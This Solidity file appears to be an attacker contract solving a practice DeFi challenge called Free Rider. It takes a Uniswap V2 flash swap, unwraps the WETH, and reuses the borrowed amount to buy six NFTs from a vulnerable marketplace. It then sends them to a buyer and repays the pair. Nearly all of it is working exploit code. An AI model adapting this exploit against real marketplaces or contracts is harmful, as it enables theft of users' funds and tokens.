// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IUniswapV2Router02
{
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory{
    
}

interface IUniswapV2Pair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IFreeRiderNFTMarketPlace{
    function buyMany(uint256[] calldata tokenIds) external payable;
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
}

interface IERC202 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint wad) external;
}

contract FreeRiderAttacker is IERC721Receiver{

    IUniswapV2Router02 private immutable uniswap;
    address private immutable buyer;
    IERC202 private immutable token;
    IERC202 private immutable weth;
    address private immutable factoryV2;
    IUniswapV2Pair private immutable pair;
    IERC721 private immutable nft;
    IFreeRiderNFTMarketPlace private immutable market;

    constructor(address _uniswap, address _buyer, address _token, address _weth, address _factoryV2,
     address _pair, address _nft, address _market) payable{

        uniswap = IUniswapV2Router02(_uniswap);
        buyer = _buyer;
        token = IERC202(_token);
        weth = IERC202(_weth);
        factoryV2 = _factoryV2;
        pair = IUniswapV2Pair(_pair);
        nft = IERC721(_nft);
        market = IFreeRiderNFTMarketPlace(_market);
    }

    function callUniswap(uint256 nftPrice) external{
        bytes memory data = abi.encode("");
        pair.swap(nftPrice, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        assert(msg.sender == address(pair)); // ensure that msg.sender is a V2 pair

        weth.withdraw(amount0); // cambio weth de uniswap por eth

        for(uint256 i = 0; i < 6; i++){
            uint256[] memory tokenIds = new uint256[](1);
            tokenIds[0] = i;
            market.buyMany{value: amount0}(tokenIds);
            nft.safeTransferFrom(address(this), address(buyer), i);
            console.log("bought %s", i);
        }
        
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(pair), weth.balanceOf(address(this)));
    }

    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory) external override returns (bytes4) {

        console.log("onERC721Received - %s", _tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}